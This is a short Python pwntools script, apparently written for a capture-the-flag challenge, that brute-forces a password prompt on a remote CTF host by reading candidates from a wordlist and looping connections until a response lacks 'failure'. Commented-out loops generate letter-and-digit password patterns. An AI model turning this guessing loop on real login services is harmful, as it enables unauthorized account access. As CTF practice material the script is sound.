import string
from pwn import *
from time import sleep
passwd_list = list()
# Generate all possible uppercase and letter combos
#for l in string.ascii_uppercase:
#    for i in range(10000):
#        passwd=f'{l}{i:04d}'
#        passwd_list.append(passwd)
#for i in range(10):
#    for l in string.ascii_uppercase:
#        for j in range(1000):
#            passwd=f'{i}{l}{j:03d}'
#            passwd_list.append(passwd)
#for i in range(100):
#    for l in string.ascii_uppercase:
#        for j in range(100):
#            passwd=f'{i:02d}{l}{j:02d}'
#            passwd_list.append(passwd)
#for i in range(1000):
#    for l in string.ascii_uppercase:
#        for j in range(10):
#            passwd=f'{i:03d}{l}{j}'
#            passwd_list.append(passwd)
#for i in range(10000):
#    for l in string.ascii_uppercase:
#        passwd=f'{i:04d}{l}'
#        passwd_list.append(passwd)

#for l in string.ascii_uppercase:
#    passwd_list.append(f'{l}2023'.encode())
#    passwd_list.append(f'2023{l}'.encode())

with open('MonthList.txt', 'r') as f:
   passwd_list = f.readlines()
for passwd in passwd_list:
    try:
        r = remote('1-nm01.bootupctf.net', 7906)
        print(r.recvuntil(b'>'))
        print(passwd)
        r.sendline(passwd)
        print(r.recvline())
        d = r.recvline()
        print(d)
        if not b"failure" in d:
            print(passwd)
            quit()

    except Exception as e:
        print(e)

